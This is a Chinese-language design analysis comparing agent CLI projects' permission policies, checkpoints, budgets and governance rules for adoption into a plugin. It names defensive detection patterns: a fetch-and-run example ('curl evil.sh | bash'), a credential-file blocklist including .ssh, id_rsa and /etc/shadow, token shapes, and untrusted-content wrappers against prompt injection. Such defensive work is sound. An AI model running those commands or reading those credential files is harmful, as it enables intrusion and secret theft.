# 生态吸纳扫描：loopx / oh-my-claudecode / oh-my-cli + 业界最佳实践（2026-08-18）

> **类型**：非约束性分析报告（Non-binding analysis）
> **日期**：2026-08-18
> **状态**：Analysis（非 Design、非 ADR）
> **方法**：3 个本地项目源码深读（结构 → README/AGENTS.md → 核心模块逐文件）+ omm 既有调研（`docs/design/loopx-intake-recommendation.md`、`docs/design/ecc-intake-recommendation.md`、`docs/analysis/autopilot-dynamic-workflows-industry-benchmark.md`）增量对齐 + 业界 Web 扫描（一手来源优先，区分"已核实"与"二手转述"）
> **范围声明**：本报告只产出吸纳建议与证据，**不产出代码、不推翻任何 ADR、不修改任何既有文档**。与 omm 设计哲学冲突的推荐显式标注 ⚠️ 并论证。
> **与既有调研的关系**：loopx 的 10 个吸纳点已被 `loopx-intake-recommendation.md` 覆盖（含实施进展），本报告对 loopx 只做**增量补充**（§3.3），不重复罗列；ECC 不在本轮主体之列（已有 `ecc-intake-recommendation.md`）。本轮的净增量主体是 **oh-my-cli**（此前零覆盖）与 **oh-my-claudecode**（此前零覆盖）。

---

## 1. 摘要（TL;DR）

**一句话结论**：三个本地项目中，**oh-my-cli 是与 omm 设计哲学同构度最高、吸纳性价比最大的项目**——它独立地把"prompt 不可信 → 确定性 runtime 强制、fail-closed、digest 绑定证据、隐私脱敏"这套哲学在单一 CLI 内实现到了极致（约 4.8 万行 src，150+ 模块几乎全部遵循同一 contract 模板），是 permission-policy 与 autopilot 的直接参照系。oh-my-claudecode（OMC）大体量是 prompt 层编排（30 skills + 19 agents + shell hooks），其 runtime 强制薄于 omm（`continuation-enforcement.ts:52-54` 自承 placeholder），但 ralph PRD、critic 验证、升级启发式有可移植零件。loopx 已被既有 intake 文档吃透，本轮仅有增量。

**最值得吸纳的 10 个特性（按性价比排序，详见 §4 路线图）：**

| # | 特性 | 来源 | omm 落点 | effort | 优先级 |
|---|------|------|----------|--------|--------|
| 1 | **命令 provenance 轴 + 远程代码执行形状检测**（`curl … \| bash` 型） | oh-my-cli `command-policy.ts` | `permission-policy` classifyCommand | S | P0 |
| 2 | **凭据路径/known-token 脱敏正则库**统一为共享原语 | oh-my-cli `permission-impact.ts` | `permission-policy`（instinct/audit 复用） | S | P0 |
| 3 | **auto-achieve 守卫语义**：provider-failure / interruption / stale-revision 阻断完成 | oh-my-cli `auto-achieve-guard.ts` | `autopilot` evidence-gate / completion-detector | S | P0 |
| 4 | **同错误签名 N 次 → 终止上报**升级启发式 | OMC `skills/autopilot/SKILL.md:60-63,106-111` | `autopilot` tool-error-tracker + stall-detector | S | P0 |
| 5 | **heredoc / 危险 shell 字符集**入权限分类 | OMC `permission-handler/index.ts:47-64` | `permission-policy` | S | P0/P1 |
| 6 | **内容寻址 turn checkpoint + undo/redo**（divergence fail-closed） | oh-my-cli `turn-checkpoint.ts` | `autopilot` 新模块 | M | P1 |
| 7 | **多维预算**（tool-calls / wall-time / cost）+ 单 active goal 队列语义 | oh-my-cli `goal-budgets.ts` / `goal-queue.ts` | `autopilot`（与 loopx windowed quota ticket 03 合流） | S-M | P1 |
| 8 | **folder-trust 用户级信任存储**（项目不可自我信任 + workspace 规范键折叠 symlink/worktree） | oh-my-cli `folder-trust.ts` | `permission-policy`（M，需 host 配合） | M | P1/P2 |
| 9 | **compaction sidecar digest 绑定 + receipt "do-not-repeat"** | oh-my-cli `compaction.ts` | `autopilot` state-persister / compaction 快照 | M | P2 |
| 10 | **worktree-lease 并行 mutating agent 隔离**（确定性 lease 身份、fail-closed 清理） | oh-my-cli `worktree-lease.ts` | host 层（OpenProse workers），omm 只出契约 | M-L | P2 |

**显式冲突项（不推荐吸纳，论证见 §2.2.4 / §2.3.4）**：OMC 的 critic 验证模式（撞 ADR-019 延迟 in-loop 模型判定的决策）、PRD 多 story 规划阶段（撞 `effort-injection.ts:43-44` 无规划阶段 + OpenProse sole runtime）、OMC 大量 prompt 层强制（撞"prompt 约束不可信"——omm 已是对的）。

---

## 2. Part 1：三个本地项目深读

> 路径约定：`oh-my-cli/src/x.ts` = `/Users/guanxueliang/Desktop/Matrix/DynamicWorkflow/oh-my-cli/src/x.ts`；`omc/src/x.ts` = `/Users/guanxueliang/Desktop/Matrix/DynamicWorkflow/oh-my-claudecode/src/x.ts`；`loopx/x.py` = `/Users/guanxueliang/Desktop/Matrix/DynamicWorkflow/loopx/x.py`。引用 omm 自身用仓库相对路径。

### 2.1 oh-my-cli —— 同哲学单体 CLI（本轮最大增量）

#### 2.1.1 它是什么

自托管 code-agent 终端 CLI（Node 22 + TS + ESM，Apache-2.0，`package.json:3-5`），对任意 OpenAI-compatible endpoint 工作；不依附 Claude Code / OpenClaw，**自己就是宿主**。README（2191 行）自述四大卖点（`README.md:11-33`）：安全即产品（approval modes + folder trust + workspace  containment + 确定性 command policy）、持久会话（JSONL，resume/compact/export/undo/redo）、headless-first 自动化（版本化 JSON 事件流、run summary/scorecard、spend budget、checkpoint recovery、evidence archive）、Electron desktop + web delivery board。另有 `AUTONOMY.md` 治理契约（自我改进队列在受保护治理面下运行）。

#### 2.1.2 核心架构与关键机制

全仓库约 150 个 src 模块，绝大多数遵循同一 contract 模板：文件头注释声明设计契约 → `SCHEMA`/`VERSION` 常量 → 纯函数/只读求值 → fail-closed 决策 → 所有输出过 `redactSecrets`/`redactHomePath`。关键机制：

- **command-policy**（`command-policy.ts:1-21,143-150`）：执行前的确定性离线策略。三要素：① **provenance**（`builtin`/`repository`/`issue`，`:31`——内置词汇表分类但永不拒绝，仓库/Issue 来源的命令受拒绝规则约束）；② 五维分类（network/write/credential/destructiveGit/pathEscape，`:33-39`）；③ 拒绝规则集（destructive_git / credential_access / path_escape / destructive_removal / device_overwrite / **remote_code_execution**，`:41-46`）。亮点：包装器穿透（`sudo rm -rf /` 按 `rm` 判，`:72-76`）、解释器管道形状检测（网络 fetch 管道进 sh/python/node 等 = RCE 形状，`:105-113`）、凭据路径正则（`.ssh/`、`id_rsa`、`*.env`、`.aws/credentials`、`/etc/shadow` 等，`:119-133`）。**yolo 模式跳过交互提示但永不跳过 policy 门**（`:15-17`）——与 omm fail-closed 完全同构。
- **permission-impact / 脱敏库**（`permission-impact.ts:1-15,44-56`）：审批预览前的影响分析与脱敏。known-token 形状库（`sk-`、`ghp_`/`gho_`/`ghs_`/`ghu_`、`github_pat_`、`AKIA`、Slack `xox[baprs]-`）+ Bearer/Basic + URL 内嵌凭据 + `--password=` flag 值 + `*_KEY=` 环境变量。README 声称审批预览 **spoof-resistant**（`README.md:14-16`）。
- **folder-trust**（`folder-trust.ts:1-24`）：单一信任权威。四启动态（trusted/untrusted/sandbox-enforced/sandbox-unavailable）；信任存储在**用户 home 下、永不是项目本地路径**（"an untrusted repository cannot trust itself"，`:15-17`）；approval modes 从属于信任决策（yolo 不能 widen boundary）；**workspace 规范键折叠 symlink 别名与 linked git worktree 为同一身份**，子 agent/leased worktree 继承父信任（`:21-24`）。
- **turn-checkpoint**（`turn-checkpoint.ts:1-21`）：内容寻址的 per-turn undo/redo。不用 git reset——per-turn collector 记录每个被触文件的 pre-image（内容或不存在），undo 恢复 pre-image + 移除会话条目，redo 重放 post-image。**divergence 检查 fail-closed**：turn-owned 文件当前内容不再匹配 checkpoint 则整个操作拒绝；冲突标记（`<<<<<<<`）文件永不是安全 undo 目标；幂等；留 durable receipt。
- **run-recovery**（`run-recovery.ts:1-15`）：有界恢复。checkpoint 只存**身份 + 内容 digest**（永不存原始证据/prompt/secret/host 路径）；完成由"匹配每步 durable evidence digest"证明，**绝不靠解析日志文本**；stale（仓库移动）/ambiguous（不同任务）/tampered（证据变化）的 checkpoint 拒绝且无 mutation。
- **compaction**（`compaction.ts:1-20`）：sidecar 式压缩。**全量 transcript 永不改写**；摘要确定性（无 LLM、内容无时间戳）且有界；`sourceDigest` = 源 transcript 前 N 条消息的 sha256，resume 时 mismatch 则 sidecar 被拒、回退全量（fail-closed）；已完成的 mutation/approval 以 **receipt + "do not repeat" 指令**表示，删细节不导致重跑；单一消费点 `loadSessionMessages`（interactive/headless/TUI/未来 subagent 全走一路）。
- **goal 系列**（`goal-queue.ts:1-15`、`goal-budgets.ts:1-10`、`auto-achieve-guard.ts:1-10`）：单 active goal + 有界 FIFO 队列（上限 10，objective 500 字符——与 omm `types.ts` goal 500 字符上限同数）；四维预算（tokens/time/cost/**tool-calls**）；auto-achieve 守卫阻断五类 outcome：provider-failure / interruption / cancellation / budget-exhausted / **stale-revision**。
- **progress-loop-detector**（`progress-loop-detector.ts:1-10,32-60`）：同一步骤连续 N 次（默认 3）无推进 → 结构化告警（含"换方法/跳过/取消 Goal"的可操作建议）。只读、确定性。
- **worktree-lease**（`worktree-lease.ts:1-20`）：一个 mutating delegated agent 一个 leased git worktree。lease 身份由 repo+task+agent **确定性派生**（同任务同 agent 同 lease，幂等）；创建拒绝非仓库/dirty parent/已出租身份；**清理拒绝有未提交改动或未合并 commit 的 worktree**，只用非强制 git 命令，无自动 merge。
- **session**（`session.ts:1-46`）：JSONL 会话，首行 `SessionMeta`（model/profile/workspace，非会话消息、永不喂模型，供 lister 展示）；`interrupted` 标记（provider 流中断的 partial turn 持久保存但**永不报告为成功最终答案**）；图片只存引用不存 dataUrl。
- **AUTONOMY.md 治理**（`AUTONOMY.md:73-106`）：10 条不可协商安全边界——只有 GitHub API 验证 author 恰为 `qwen-code-dev-bot` 的 open Issue 才能进入执行（`:84-86`）；bot 不可改自己的治理文件（`:89-92`）；**第三个相同代码失败即隔离**（quarantine），保存证据、释放 lease、继续做无关可信工作而非永远重试（`:100-101`）；单 coordinator loop 幂等恢复、永不自删、永不宣布产品完成（`:104-106`）。

#### 2.1.3 可吸纳特性清单

| # | 特性 | 解决什么 | omm 现状 | 切入点 / 成本 |
|---|------|----------|----------|----------------|
| C1 | **provenance 轴 + RCE 管道形状**（C2 的 policy 部分） | 权限决策不知道命令"从哪来"；`curl evil.sh \| bash` 形状逃过单命令分类 | `permission-policy` classifyCommand 有 11 类但**无 provenance 维度、无管道形状检测** | `packages/permission-policy/src/permission-policy.ts` 加 `CommandProvenance` + `remote_code_execution` 规则。**S**。纯函数库内扩展，不撞任何决策 |
| C2 | **凭据路径 + known-token 脱敏正则库** | 审计/记忆/投影输出泄 secret | `instinct/src/store.ts` 有 `scrubSecrets`（自实现）；`audit-persister.ts` 各自为战 | 提为 `permission-policy` 共享原语（正中"共享原语单一事实源"哲学），instinct/audit/autopilot projection 复用。**S** |
| C3 | **auto-achieve 守卫五 blocker** | "provider 失败/中断/预算耗尽后 agent 仍宣布完成" | evidence-gate 有 resume 守门；**stale-revision（目标已被修订，旧证据失效）无语义** | `autopilot/src/evidence-gate.ts` + `completion-detector.ts`：goal revision 计数，修订后旧 evidence 标记 stale。**S**。与 loopx intake #1（fingerprint receipt，ticket 04 pending）同族互补——fingerprint 绑 diff，stale-revision 绑 goal |
| C4 | **内容寻址 turn checkpoint + undo/redo** | autopilot 无"撤销上一轮"能力；checkpoint 只管状态不管工作区 | 缺失。`state-persister.ts` 是状态快照，不含文件 pre-image | `autopilot/src/` 新模块 `turn-checkpoint.ts`：after_tool_call 收集写类工具的 pre-image。divergence fail-closed + 幂等 + receipt 三件套照抄设计。**M**。注意 omm 是插件非宿主，写工具调用经 host——需确认 hook 能拿到写前内容（**信息缺口**，见 §6） |
| C5 | **多维预算 + 单 active goal 队列** | token 单维预算不够（host telemetry 不可靠，loopx intake #6 已判 E2 死结）；多 goal 并发无契约 | token 预算有；**tool-calls 计数维度缺**（确定性、不依赖 telemetry）；goal 单 active 语义未显式化 | `autopilot` types + continuation-engine。与 loopx windowed slot quota（ticket 03）**合流设计**：tool-calls/window 就是"可数单位"的另一种。**S-M** |
| C6 | **folder-trust 用户级信任存储 + workspace 规范键** | 项目内配置不可自授信任；worktree/symlink 逃逸信任边界 | autopilot 3.0.0 有 trustWorkspace flip 教训（loopx intake #7 提及）；无独立信任原语 | `permission-policy` 加信任判定纯函数 + 规范键函数；存储在 host。**M，host-dependent**。⚠️ 需先理清与 host 既有 trustWorkspace 的关系，避免第二信任源 |
| C7 | **compaction sidecar + sourceDigest + do-not-repeat receipt** | compaction 快照与 transcript 脱钩即危险；压缩后重跑已完成动作 | autopilot 有 compaction 快照（`state-persister.ts`），但**无 digest 绑定、无 receipt 语义** | `state-persister.ts` 扩展。**M**。源 digest 需要 transcript 访问——omm 只见事件流，可用"事件计数 + 末事件 hash"替代（**信息缺口**，见 §6） |
| C8 | **progress-loop per-step 计数** | stall 检测偏全局；同一步反复尝试是更细信号 | `stall-detector.ts` 有（基于无进展轮次） | stall-detector 加"当前步骤签名连续次数"。**S**。与 C4/OMC A3 三源合一设计 |
| C9 | **worktree-lease 契约** | 并行 mutating subagent 同工作区互相覆盖 | 无；dynamic-workflows guard 管权限不管工作区隔离 | host 层（OpenProse worker spawn 处）。omm 只能出契约文档 + 在 `dynamic-workflows` skill 里教 agent 用。**M-L，host-dependent，P2** |
| C10 | **AUTONOMY 治理边界**（文档级） | 自主自我改进的护栏 | omm 无自我改进 loop（非目标） | **不吸纳代码**；治理思想（验证 author 才执行、bot 不可改自身治理、第三同败即隔离）可作 omm 未来 automation 的 ADR 素材。"第三同败即隔离"与 C4/A3 同族 |

**不吸纳（诚实）**：Electron desktop / web delivery board / TUI（omm 是插件，UI 归 host 的 compact projection）；headless JSON 协议（omm 走 host RPC）；provider 抽象（omm 不持有 provider）；LSP runtime（omm 无此需求）。

---

### 2.2 oh-my-claudecode（OMC）—— prompt 层编排巨兽

#### 2.2.1 它是什么

Claude Code 的多 agent 编排层（`oh-my-claude-sisyphus` v4.14.6，MIT，Yeachan-Heo，`omc/package.json:1-7`），灵感来自 oh-my-opencode。形态 = **shell hooks（hooks.json）+ 30 skills + 19 agents + MCP servers + 状态目录 `.omc/`** 的 Claude Code 插件包。目标宿主：Claude Code（经 `spawn_agent`/`Task`、`.claude/settings`、skill 机制），兼 Codex 提示词。

#### 2.2.2 核心架构与关键机制

- **执行模式族**（skill + hook 成对）：`ralph`（持久循环）、`autopilot`（6 阶段：Expansion→Planning→Execution→QA→Validation→Cleanup，`skills/autopilot/SKILL.md:39-74`）、`ultrawork`（并行强化）、`team`（N agent 流水线 team-plan→team-prd→team-exec→team-verify→team-fix）、`ultraqa`、`swarm`。模式间有互斥（ralph vs ultraqa，`hooks/ralph/loop.ts:289-294`）与联动（ralph 默认 auto-activate ultrawork，`:349-363`；team 终态可让 ralph complete，`:527-555`）。
- **ralph PRD**（`hooks/ralph/prd.ts:23-51`）：`prd.json` = userStories[]，每 story 有 id/title/description/**acceptanceCriteria**/priority/**passes:boolean**/architectVerified。完成 = 所有 story passes:true（`loop.ts:560-563`）。附 `progress.txt` 学习/模式日志。
- **ralph critic 验证**（`hooks/ralph/verifier.ts:1-13,53-55`）：ralph 声称完成 → 进入 verification mode → architect/critic/**外部 Codex CLI** 三种 reviewer 模式（`RALPH_CRITIC_MODES`，`loop.ts:114`）→ 批准才真正完成，否则带反馈继续。max 3 次后 force-accept。`request_id` 关联批准与当次验证尝试。
- **permission-handler**（`hooks/permission-handler/index.ts:33-87`）：PreToolUse 级守卫。SAFE_PATTERNS 白名单（`:33-45`，明确移除 cat/head/tail——"they allow reading arbitrary files"）；**DANGEROUS_SHELL_CHARS** 元字符集（`:51`）；**heredoc 检测** + 安全 heredoc 白名单（git commit/tag，`:53-64`）；ripgrep 安全 flag 集；**BACKGROUND_MUTATION_SUBAGENTS** 名单（`:78-87`——按子代理角色区分可变权限）。
- **verification 特征库**（`features/verification/index.ts:27-87`）：STANDARD_CHECKS = BUILD/TEST/LINT/FUNCTIONALITY/ARCHITECT/TODO/ERROR_FREE，evidence-based checklist，ralph/ultrawork/autopilot 三处复用的单一事实源。
- **model-routing**（`features/model-routing/scorer.ts:19-62`）：加权打分 → Haiku/Sonnet/Opus 三档。信号三类：lexical（词数/关键词/问题深度）、structural（子任务数/跨文件/可逆性/影响面）、**context（previousFailure +2/次上限 +4、deep agent chain +2）**。阈值 HIGH≥8/MEDIUM≥4。
- **continuation-enforcement**（`features/continuation-enforcement.ts:52-54,74-134`）：⚠️ 自承 placeholder——`hasIncompleteTasks = false` 硬编码，真正的"强制"是 130 行 system prompt 注入（"THE BOULDER NEVER STOPS" 咒语式语言）。**这是"prompt 约束"路线的标本**，omm 哲学下不可信。
- **preemptive-compaction**（`hooks/preemptive-compaction/index.ts:36-50`）：上下文用量估算（chars/token 近似）+ 告警；**rapid-fire debounce**（500ms 窗口内并发 tool 完成只分析一次，针对 swarm/ultrawork 并发洪峰，issue #453）。
- **状态与隔离**（`AGENTS.md:345-354`）：`.omc/state/` 模式状态 JSON、session-scoped 路径（`resolveSessionStatePaths()` 唯一产出处，ESLint 禁越权 cast）、**PID-aware liveness**（死 owner 不阻塞 state restore）、`.omc-workspace` marker 锚定多 repo 共享 `.omc/`。
- **prompt-injection 助手**（`mcp/prompt-injection.ts:42-48`）：`SUBAGENT_HEADER`（防子代理递归 spawn）、`wrapUntrustedFileContent`/`wrapUntrustedCliResponse`（不可信内容包裹）、`sanitizePromptContent`。
- **project-memory**（`hooks/project-memory/index.ts:17-41`）：跨会话项目知识；**rescan merge 纪律**——schema 已知字段以新探测为准（删除的依赖正确消失），用户贡献的数组（customNotes/userDirectives/hotPaths）跨 rescan 存活，未知字段保留。

#### 2.2.3 可吸纳特性清单

| # | 特性 | 解决什么 | omm 现状 | 切入点 / 成本 |
|---|------|----------|----------|----------------|
| A1 | **heredoc + 危险 shell 字符集**（含"移除 cat/head/tail 出白名单"的教训） | 命令拼接/注入绕过单命令匹配 | classifyCommand 11 类；**无 heredoc 体检测** | `permission-policy/src/permission-policy.ts`。**S**。与 C1 合并做 |
| A2 | **BACKGROUND_MUTATION_SUBAGENTS 角色名单** | 子代理按角色区分可变权限 | dynamic-workflows guard fail-closed 统一处理 subagent，无角色分级 | 可选项：角色信息经 host event 传入。⚠️ 与"子代理皆不可信"（D6，`architecture.md:86-93`）有张力——角色分级是"部分可信"的口子。**除非有真实需求，不引** |
| A3 | **同错误 3 次 → 停报根本问题**（`skills/autopilot/SKILL.md:60-63,106-111`）；QA 同错误 3 cycle 升级 | stall 检测的信号升级：重复同错误 ≠ 无进展，是"根本性阻塞" | `tool-error-tracker.ts` + `stall-detector.ts` 已有基础 | tool-error-tracker 加错误签名连续计数 → 新 blocked reason。**S**。与 oh-my-cli AUTONOMY"第三同败即隔离"（C10）跨项目互证——**三家独立收敛到同一阈值，可信度高** |
| A4 | **context 信号：previousFailure 升档**（`scorer.ts:57-60`） | 失败过的任务该用更强模型 | `model-routing.ts` 已有 evidence failed → premium（E10 修复）。**等价物已有** | 不引；记录为"独立收敛"证据 |
| A5 | **project-memory rescan merge 纪律**（探测字段权威 + 用户字段存活） | instinct 未来做 distillation 时的记忆更新语义 | instinct 目前只 append JSONL，无 merge 问题 | instinct 引入 extraction 阶段时参考。**S（届时）**。记入 instinct 设计 backlog |
| A6 | **rapid-fire debounce**（并发洪峰去重） | swarm 并发完成时重复分析/告警 | autopilot 单会话串行，场景暂不存在 | 不引；dynamic-workflows 并行场景若接入再议 |
| A7 | **PID-aware liveness + `.omc-workspace` marker** | 死进程不阻塞 state restore；多 repo 共享状态 | omm 状态经 host，session-key 分区已有 | host 层话题，omm 无法独立落地。**P2/不引** |
| A8 | **wrapUntrustedFileContent / SUBAGENT_HEADER** | 不可信内容进 prompt 的标记纪律 | dynamic-workflows skill 教 agent 写 .prose，无内容包裹指引 | 可作为 `dynamic-workflows/skill/` 的指引增量（markdown 级）。**S**。注意这只是 prompt 层纪律，omm 哲学下是补充不是防线 |

#### 2.2.4 ⚠️ 显式冲突项（不推荐，须论证）

- **ralph critic 验证模式（含外部 Codex critic）**：本质是 **in-loop 模型判定完成**——撞 ADR-019（`docs/adr/019-conditional-evidence-judging-boundary.md`）"延迟 model-level 证据判定"的决策。即使 reviewer 是外部 CLI（Codex），仍是模型判模型。**论证**：ADR-019 的延迟理由是 capability 不可行 + cost/benefit，外部 CLI 不解决 capability 问题（判定质量仍无 ground truth）。omm 的正解仍是 loopx intake #5 human gate（人是 ground truth）。**不引**；若未来重开 ADR-019，OMC 的 `request_id` 关联（verifier.ts:53-55——批准必须绑定当次验证尝试，防过期批准）是唯一值得带进重开讨论的零件。
- **PRD 多 story 规划**：撞 `effort-injection.ts:43-44`（NO planning phase）+ OpenProse sole runtime（ADR-009/ADR-014）。omm 已实施轻量替代：goal AC-NNN 字段（ticket 06）+ size-classifier（ticket 11）。**不引**；ralph 的 "next story" 指针思想已被 loopx intake 的 successor chaining/openItems（ticket 07）覆盖。
- **continuation prompt 咒语**（continuation-enforcement.ts:74-134）：prompt 层强制，omm 哲学下不可信，且 omm 的 runtime continuation-engine 已严格更强。**不引**，留作对照标本。

**不吸纳（其他）**：30 skills 的内容（prompt 资产，omm 有自己的 skill）；MCP server 群（omm 走 host）；HUD/CLI 包装（UI 归 host）。

---

### 2.3 loopx —— 增量补充（主评估见 `docs/design/loopx-intake-recommendation.md`）

#### 2.3.1 本轮增量范围

`loopx-intake-recommendation.md`（2026-08-10/12）已覆盖：turn-as-transaction 7 相位、operator_gate、windowed quota、event-sourced state、state_migration、completion_policy、goal_vision、pr_review_queue exact-head、change-quality fingerprint receipt、dual-mode regression——10 个吸纳点 + 13 ticket + 实施进展。本节只补该文档**未覆盖**的角落。

#### 2.3.2 增量发现

- **authority.py 的公私边界原语**（`loopx/authority.py:17-33`）：authority source 三级边界 `public / local_private / private_redacted` + PRIVATE_TEXT_PATTERNS（本地路径、Bearer、Authorization、token=、password、secret 等正则）。与 oh-my-cli C2 同族——**脱敏/边界是三个项目独立收敛的第三个共识点**（loopx authority、oh-my-cli permission-impact、OMC prompt-injection wrap）。omm 应一次做到位：permission-policy 出一个 `redact` 共享原语，三家之长合并（known-token 形状取 oh-my-cli，边界三级取 loopx，不可信包裹指引取 OMC）。
- **agent_turn_recall capability**（`loopx/capabilities/agent_turn_recall/`）：按 goal/agent/surface 召回历史 turn 的 situation + guidance，输出去经 `public_safety.public_safe_compact_text`。这是 instinct 的"召回侧"参照：omm instinct 目前是"最近 N 条全量注入"（`instinct/index.ts:114-122`），loopx 展示了**按 goal 作用域召回 + 公共安全的紧凑文本**的方向。P2，instinct 二期参考。
- **AGENTS.md 的 projection sink 纪律**（`loopx/AGENTS.md` "Projection Sink Design" 节）：展示层只消费**公共安全的 projection 面**（todo projection/quota contract/frontstage），禁止 sink 解析项目私有源文件；row lineage 作为数据（`row_lifecycle`/`supersedes`/`superseded_by`）而非散文。对 omm 的 `projection.ts`（compact projection 给宿主 UI）是直接的设计纪律参考：projection 输出应自带 lineage 字段。**S，文档/契约级**。
- **continuous_monitor todos**（`loopx/AGENTS.md` "Automation And Monitor Todos" 节）：项目特定监控不硬编码进通用 heartbeat prompt，而作为带 `claimed_by`/`unblocks_todo_id` 元数据的 state todo，由 heartbeat 经 projection 发现。与 omm retry-queue 的"队列项带元数据、调度器通用"思想一致，互证，无新增吸纳。

#### 2.3.3 loopx 侧无新 P0/P1

既有 10 点仍是主清单，本节仅记录三个补充零件（authority 脱敏边界 → C2 合并项；goal-scoped recall → instinct 二期；projection lineage → projection 契约）。

---

## 3. Part 2：业界最佳实践与 GitHub 同生态扫描

> 每条标注 **[一手]**（官方文档/源码/arXiv/官方 changelog，本轮直接读取或既有报告已核实）或 **[二手]**（媒体/博客转述，未经一手核实）。既有报告（benchmark doc、loopx/ecc intake）已核实过的一手来源此处继承其核实状态并注明。

### 3.1 长程执行 / 自主循环

- **Ralph loop 已主流化并成为官方插件**。[二手] 多篇 2026 报道（[boostN.ai 2026-06](https://boostn.ai/en/app/news/ralph-loop-loop-engineering-token-burn/)、[theaiarchitects 2026-05](https://theaiarchitects.com/blog/claude-code-ralph-loop)）称 ralph 模式从 Geoffrey Huntley 的 bash hack 成为固定术语，并出现官方 ralph-wiggum 插件；[一手-源码] [snarktank/ralph](https://github.com/snarktank/ralph) 是社区代表实现——每轮 fresh context 对 PRD 迭代直到全完成。**对 omm 的含义**：omm autopilot 的"事件驱动 reducer + evidence gate"在工程严谨度上明显高于 fresh-context ralph（无状态、无证据绑定），且 OMC ralph 的 PRD passes:boolean 与 omm AC-NNN 等价物已在。无需追随，但"token-burn 问题"的报道印证 omm token 预算 + windowed quota（ticket 03）的必要性。
- **LangGraph checkpointer 生产化共识 = Postgres**。[二手] [zenthos.in 2026-07](https://zenthos.in/blogs/langgraph-postgres-checkpointer-production) 对比四种后端（Postgres 全 ACID/并发/可扩展；SQLite 单节点）；[一手（继承 benchmark doc）] [LangGraph HITL 官方文档](https://docs.langchain.com/oss/python/langchain/human-in-the-loop) 的 interrupt + checkpointer 恢复模型不变。
- **"checkpoint ≠ durable execution"的批评值得 omm 警惕**。[二手] [Diagrid 2026-02](https://www.diagrid.io/blog/checkpoints-are-not-durable-execution-why-langgraph-crewai-google-adk-and-others-fall-short-for-production-agent-workflows)：checkpointer 存状态但**不做自动失败检测**——进程死了状态完好却无人恢复它。omm autopilot 经 host gateway 重启恢复（session_start re-derive），这一点 omm 架构天然优于"图框架 + 自管进程"，但依赖 host 存活——Distribution Reality（`docs/architecture.md` §Distribution Reality）已知。
- **OpenHands SDK = event-sourced state + deterministic replay**。[一手-arXiv] [OpenHands Software Agent SDK 论文（arXiv 2511.03690v2，2026-04 更新）](https://arxiv.org/html/2511.03690v2)：事件溯源状态模型 + 确定性重放 + 不可变 agent 配置 + typed tool system；[一手-官方文档] [Persistence](https://docs.openhands.dev/sdk/guides/convo-persistence) / [Pause and Resume](https://docs.openhands.dev/sdk/guides/convo-pause-and-resume)（docs.openhands.dev）。**与 loopx event-sourced、omm 稳定转换点 checkpoint 互为三个独立实现**——event sourcing 是该域的收敛方向，omm 的"快照 + 派生"更轻但牺牲了逐步 replay；oh-my-cli 的 turn-checkpoint（C4）是补齐"可操作恢复"的最小增量。
- **Aider/Cline/OpenHands 三强对比**（[二手] [dibi8 2026-05](https://dibi8.com/resources/dev-utils/aider-cline-openhands-2026-honest-comparison/)）：aider 的差异化在 tree-sitter repo map + 原子 git commit；OpenHands 在沙箱全自主。与 omm 无直接吸纳点（omm 不持有 repo map / commit 策略），记录备查。

### 3.2 多 agent 编排 DSL / 框架

- **OpenProse（omm 的宿主编排引擎）近况**。[一手-GitHub] [openprose/prose](https://github.com/openprose/prose)：README 自述已从"AI session 编程语言"演进为"**declarative language for standing AI work**"（声明式、常驻型工作）；[一手-changelog] [CHANGELOG 0.10.0（2026-04-20）](https://github.com/openprose/prose/blob/main/CHANGELOG.md)：新增 agent onboarding narrative、Codex 入口（AGENTS.md + `max_depth = 2` 递归多服务程序建议）、LongCoT benchmark 自动化。[一手] [prose.md/learn](https://prose.md/learn) 有 VM 模型 / compile-run 两相 / "Prose Complete" 标准。**对 omm 的含义**：dynamic-workflows 的 skill 教 agent 生成 .prose，宿主引擎向"声明式 standing work"演进意味着 11 种编排模式的教学内容应跟随上游 0.10+ 的 onboarding 文档校准（**行动项：diff `packages/dynamic-workflows/skill/` 与上游 `skills/open-prose/` 0.10.x**）。
- **rawwerks/dynamic-agent-workflows——与 omm 哲学最同构的外部项目**。[一手-GitHub，本轮直接读取] [AGENTS.md](https://github.com/rawwerks/dynamic-agent-workflows/blob/main/AGENTS.md)：6 cores / 37 variants / 38 principles 的 taxonomy（`TAXONOMY.md`）；跨 7 框架 × 6 模式 = 42/42 **全部真跑过**才计入能力网格；两条治理 bar（拓扑互异性 + 多语言可表达性）；**provenance gate**——`meta/provenance.json` 把每个发布的翻译实现以 `impl_sha256` 哈希绑定到一次通过的 conformance run，改一行即失效（"published == tested" 的确定性不变量，源自 2026-06-22 Flue 事件：五个对着虚构 API 写的翻译靠肉眼不可分辨，只有执行能抓）；trace 必须以 `run_env` 事件开头绑定 framework@version+model+harness。**对 omm 的含义**：①其"6 cores"taxonomy 是 dynamic-workflows skill 11 模式的独立对照表——值得做一次模式覆盖 diff（文档级，S）；②provenance gate 思想 = omm 已在走的 fingerprint receipt（loopx intake #1，ticket 04）的推广形态——**证据哈希绑定的不只是 diff，而是"任何可发布产物与其测试运行"**，可作 ticket 04 设计的参照系；③"docs-only miss 是假设不是发现，跑最小真实实验再记录 missing primitive"是研究纪律，适用于 omm 未来的能力评估。
- **微软：AutoGen 已 maintenance mode，Agent Framework 1.0 GA（2026-04-03）**。[二手，多源一致] [learnagent 2026-05](https://learnagent.org/library/compare/agent-framework-comparison-2026/)、[genai.qa 2026-06](https://genai.qa/blog/crewai-vs-autogen/)、[raftlabs 2026-04](https://www.raftlabs.com/blog/ai-agent-framework-comparison)：AutoGen 不再开发新功能，社区分支 AG2 活跃但体量小；Microsoft Agent Framework 合并 AutoGen 编排 + Semantic Kernel 生产基础。**对 omm 的含义**：群聊式编排（AutoGen/CrewAI）路线在大厂侧已被"企业级单 SDK"收编，omm 的"守卫 + 外挂运行时"微内核路线没有竞争者收敛过来的迹象——benchmark doc 的"第四条路"判断仍稳。
- **2026 框架格局收敛为五家三模型**。[二手] [agentmelt 2026-08](https://agentmelt.com/blog/ai-agent-frameworks-compared-2026/)：LangGraph/Google ADK（graph）、CrewAI（crew/角色）、OpenAI Agents SDK（handoff）、Microsoft Agent Framework。**均为能力锥框架，权限单点收敛层均缺**——benchmark doc 张力 5 的判断（permission-policy 是 omm 独特权衡价值）在 2026-08 时点仍成立。

### 3.3 agent 运行时安全

